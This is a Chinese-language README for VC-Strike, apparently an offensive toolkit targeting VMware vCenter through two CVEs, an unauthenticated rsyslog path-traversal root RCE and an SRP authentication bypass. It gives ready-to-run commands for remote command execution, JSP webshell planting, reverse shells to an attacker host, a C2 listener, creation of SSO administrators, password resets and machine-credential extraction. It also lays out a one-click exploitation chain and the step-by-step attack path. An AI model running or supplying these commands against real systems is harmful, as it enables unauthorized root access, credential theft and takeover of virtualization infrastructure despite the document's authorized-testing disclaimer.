<div align="center">

# VC-Strike

**VMware vCenter 一体化授权渗透测试套件**

`CVE-2026-59310` 未授权 root RCE · `CVE-2026-59309` 未授权 SRP 认证绕过

GUI + CLI · 零第三方依赖 · Python 3.8+

[功能](#-功能) · [快速开始](#-快速开始) · [攻击链](#-攻击链) · [检测与加固](docs/检测与加固.md) · [安全边界](#%EF%B8%8F-安全边界) · [法律声明](#-法律声明)

</div>

---

> ⚠️ **仅供已获书面授权的渗透测试、漏洞验证与防御研究使用。**
> 对未授权目标使用本工具所产生的一切后果由使用者自行承担。

## 📌 漏洞概要

| | CVE-2026-59310 | CVE-2026-59309 |
|---|---|---|
| 组件 | vCenter rsyslog 动态路径模板 | vmdird（Cyrus SASL SRP 插件 `libsrp.so`）|
| 类型 | 路径穿越 → 任意文件写 → root RCE | SRP 认证绕过（`A ≡ 0 (mod N)` 未校验）|
| 前置条件 | UDP/TCP 514 可达，**无需凭据** | TCP 389 / 636 / 2020 可达，**无需凭据** |
| CVSS 3.1 | 9.8 Critical | 9.8 Critical |
| 修复版本 | 9.1.0.0300 / 9.0.2.0100 (Build 25629525) / 8.0 U3k / 8.0 U2f | 同左（VMSA-2026-0006）|

**VC-Strike** / 指纹 ｜ 利用 ｜ 拿权 ｜ 后渗透 ｜ C2 会话 ｜ 清理 ｜ 检测加固，一仓打尽。

## ✨ 功能

| 模块 | 能力 |
|---|---|
| **指纹** | 批量探测 443/5480/514/1514/389/636/2020、API 版本、rootDSE SASL 机制；CSV 报告（仅探测不利用）|
| **59310 利用** | 非破坏写入验证 · 任意文件写（APP-NAME/HOSTNAME 双向量+报文预览）· RCE + VAMI HTTP 回显 · RCE 落盘 · 反弹 shell · JSP WebShell 植入 |
| **59309 利用** | SRP 机制探测 · **认证绕过**（A=N → K=SHA1("")）· SSO 用户/管理员组枚举 · 创建 SSO 管理员 · 重置任意账户密码 · LDAP 查询控制台 |
| **C2** | 多端口监听 · 多会话管理（GUI 会话表 / CLI REPL）· 交互直通 · exec 回显 · **上传/下载**（shell 通道 base64 分块）|
| **⑧ 一键打通** | 只填 IP：59310 RCE → 机器账户/SSO 域提取 → 目录接管（机器账户 bind，59309 SRP 降级）→ 新建管理员 → bind 回验+组成员确认 → 交付可登录 /ui 的账户；三路自动降级 |
| **后渗透** | 系统信息 · vmdir 机器账户（dcAccountDN/Password）提取 · SSO 域名读取 · 网络/服务/计划任务盘点 · 59310 入侵痕迹快扫 |
| **清理** | 聚合本次会话全部落点 → 生成/复制清理命令 |
| **检测加固** | 版本自查 · rsyslog 危险模板排查 · 入侵痕迹排查 · IOC · 缓解措施 |

技术实现要点：BER/LDAP 从零自实现；Cyrus SASL SRP 报文、M1/M2 构造、
AES-128-OFB + HMAC-SHA1 安全层**逐字段对照 cyrus-sasl 2.1.26 `plugins/srp.c`**；
内置纯 Python AES-128（通过 FIPS-197 官方测试向量）。

## 🚀 快速开始

```bash
git clone https://github.com/chu0119/vc-strike.git
cd vc-strike

python -m vcstrike selftest      # 离线自检（AES 向量/BER/SRP 构造）
python vc-strike.py              # GUI（无参数默认）
python -m vcstrike --help        # CLI
```

CLI 速览（完整见 [docs/使用手册](docs/使用手册.md)）：

```bash
# 指纹（仅探测）
python -m vcstrike scan 10.0.0.1,10.0.0.2 --out r.csv

# CVE-2026-59310：写入验证 → RCE 带回显 → WebShell → 反弹
python -m vcstrike check59310 10.0.0.1
python -m vcstrike exec59310 10.0.0.1 -c 'id; cat /etc/vmware-release'
python -m vcstrike webshell 10.0.0.1
python -m vcstrike revshell 10.0.0.1 --lhost 10.0.0.5 --lport 4444

# C2 多会话控制台
python -m vcstrike listen --ports 4444,8443

# CVE-2026-59309：探测 → 绕过 → SSO 目录操作
python -m vcstrike check59309 10.0.0.1 --bypass
python -m vcstrike ldap59309 10.0.0.1 enum-users
python -m vcstrike ldap59309 10.0.0.1 add-admin --user pentest_x --pass 'Str0ng!Pass'

# 后渗透
python -m vcstrike postex 10.0.0.1 machine-creds

# 一键打通：59310/59309 联动，交付可登录 /ui 的 SSO 管理员
python -m vcstrike chain 10.0.0.1
```

## ⛓ 攻击链

```
【CVE-2026-59310】
  RFC5424 APP-NAME="rsyslog/../../../../../<path>"
    └→ 动态模板逃逸 → 任意路径 root 写
        ├→ /etc/cron.d/<x>-syslog.log（换行穿透，cron 行落第 0 列）
        │    └→ crond 每分钟以 root 执行
        │         ├→ 输出重定向 /opt/vmware/share/htdocs/ → VAMI :5480 HTTP 回显
        │         ├→ 反弹 shell（bash /dev/tcp / python3）→ C2 会话
        │         └→ cp 落地 JSP → perfcharts statsreport WebShell
        └→ 备用向量：HOSTNAME="../"×16（esxLoc 模板）

【CVE-2026-59309】
  LDAP SASL bind(mech=SRP)
    └→ 服务端下发 N,g,s,B,L
        └→ 客户端发 A=N（未校验 A mod N == 0）
            └→ 服务端 S=0 → K=SHA1("") 公开常量
                └→ 伪造 M1（输入全部公开）→ bind 成功
                    ├→ 任意身份读写 SSO 目录
                    ├→ 创建 SSO 管理员 / 重置任意账户密码
                    └→ SASL 安全层（AES-128-OFB+HMAC-SHA1）客户端镜像

【组合】59310 RCE → lwregshell 提取机器账户 → 直连 LDAPS / 横向
        59309 建管 → 登录 /ui → 配合 WebShell / statsreport
```

详细原理：[docs/漏洞分析.md](docs/漏洞分析.md)

## 🛡️ 安全边界（有意不实现）

本工具面向**授权测试**，演示止步于权限与影响证明（root RCE、WebShell、
目录管理员、凭据提取）。以下能力**不会**实现，请勿提 issue：

- ESXi 勒索 / 虚拟机破坏类操作
- 隐蔽持久化（开机自启、beacon 心跳、断线自动重连）
- 免杀 / EDR 规避 / 流量伪装

## ⚠️ 关于代码中的 SHA-1 / AES-OFB / 自签 TLS

这些是**被测协议的既定构成**：CVE-2026-59309 的会话密钥 K 恒等于
`SHA1("")`，SASL 安全层固定 AES-128-OFB + HMAC-SHA1（服务端 srp.c 硬编码），
vCenter 出厂自签证书。它们不是本工具自身的安全选择，替换将导致协议
不兼容、利用必然失败（详见源码 `[协议保真]` 注释块与
[docs/漏洞分析.md](docs/漏洞分析.md)）。

## 🗂 工作约定（维护守则）

- **本地仓库：`D:\xiangmu\vc-strike`** —— 本项目的全部开发、测试、构建、打包
  操作一律在项目目录内进行，构建产物（build/dist/spec）也留在目录内，
  不外散、不提交进 git。
- 预编译 exe 挂 **GitHub Releases**，仓库内只进源码与文档。
- UI / 交互改动请走 `tools_ui_shots.py` 截图 + Agent 审查循环，全部页签
  PASS 后再合入（流程见 CONTRIBUTING.md）。

## 📦 打包与下载

**预编译版本**：[Releases](https://github.com/chu0119/vc-strike/releases) 下载

| 产物 | 说明 |
|---|---|
| `VC-Strike.exe` | 单文件，CLI + GUI 双形态（带控制台）|
| `VC-Strike-GUI.exe` | 单文件纯 GUI（无控制台窗口）|
| `checksums.txt` | SHA256 校验值 |

> PyInstaller 打包的 exe 可能被杀毒软件误报（通用壳特征），请以 checksums.txt
> 校验为准，或直接 `python vc-strike.py` 源码运行（零依赖，无供应链风险）。

**本地打包**（在项目目录 `D:\xiangmu\vc-strike` 内执行）：

```bash
pip install pyinstaller
python -m PyInstaller --noconfirm --clean --onefile --name VC-Strike vc-strike.py
python -m PyInstaller --noconfirm --clean --onefile --windowed --name VC-Strike-GUI vc-strike-gui.py
# 产物在 dist/ 下；校验值：
python -c "import hashlib,glob;[print(hashlib.sha256(open(f,'rb').read()).hexdigest(), f) for f in glob.glob('dist/*')]"
```

## 🧾 运行日志（测试后请回传）

每次运行自动在 **exe/脚本同目录** 生成日志：`vc-strike-<gui|cli>-<时间戳>.log`

- 内容：环境头（版本/系统/DPI 缩放）、全部操作记录与结果、异常完整堆栈、
  C2 会话原始流（ANSI 已剥离）、结束标记
- GUI 底部日志栏有 **"打开日志目录"** 按钮可直接定位
- **测试结束后直接把日志文件发给维护者**，即可基于真实运行数据做
  二次加固与修复（无需复述操作过程）

## 📖 文档

- [使用手册（GUI/CLI/C2 全参数）](docs/使用手册.md)
- [漏洞分析（协议级细节）](docs/漏洞分析.md)
- [检测与加固（防御视角）](docs/检测与加固.md)

## 🤝 贡献与反馈

见 [CONTRIBUTING.md](CONTRIBUTING.md) 与 [SECURITY.md](SECURITY.md)。
漏洞利用相关的 issue/PR 请附授权背景说明。

## 📄 法律声明

本仓库以 [MIT License](LICENSE) 开源，但**授权范围不含任何未授权访问行为**。
使用者应遵守所在司法辖区的法律法规（包括但不限于《网络安全法》、
《计算机欺诈与滥用法》等）。项目作者不对滥用行为承担责任。

## 🙏 参考

- [ChinaRan0/CVE-2026-59310-POC](https://github.com/ChinaRan0/CVE-2026-59310-POC) — 上游 POC/EXP
- [QUIRSO/QTR](https://github.com/QUIRSO/QTR) — IR 工件与 IOC
- [Mobeta 技术分析](https://mobeta.fr/blog/vcenter-cve-2026-59309-cve-2026-59310/)
- [VMSA-2026-0006](https://support.broadcom.com/web/ecx/support-content-notification/-/external/content/SecurityAdvisories/0/38017) /
  [GHSA-xmp9-244p-5ggv](https://github.com/rsyslog/rsyslog/security/advisories/GHSA-xmp9-244p-5ggv)
